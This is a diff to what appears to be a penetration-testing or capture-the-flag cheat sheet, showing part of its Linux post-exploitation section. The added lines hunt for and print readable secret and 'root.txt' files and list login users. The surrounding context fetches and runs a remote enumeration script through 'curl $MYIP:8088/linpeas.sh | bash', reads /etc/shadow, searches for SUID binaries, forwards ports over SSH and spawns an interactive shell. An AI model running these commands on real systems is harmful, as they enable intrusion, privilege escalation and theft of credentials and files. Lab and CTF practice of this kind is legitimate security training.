@@ -361,6 +361,9 @@ sessions -i 1
 # Post-Exploitation 
 ## Linux
 [*] Enumeration
+find / -name '*secret0*' -readable 2>/dev/null | xargs cat
+find / -name 'root.txt' -readable -exec echo {} \; -exec cat {} \; 2>/dev/null
+cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
 sudo -l
 find / -perm /4000 2>/dev/null
 cat /etc/crontab
@@ -372,8 +375,7 @@ cat /etc/shadow
 curl $MYIP:8088/linpeas.sh | bash
 su $USERNAME --preserve-environment
 ssh $USERNAME@$TARGET -i sshkey.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
-cat /etc/passwd | grep -vE 'nologin' | cut -d ':' -f '1'
-find / -readable -name 'root.txt' -exec echo {} \; -exec cat {} \; 2>/dev/null
+
 [*] Upgrade TTY
 python3 -c 'import pty; pty.spawn("/bin/bash")';
 CTRL-Z
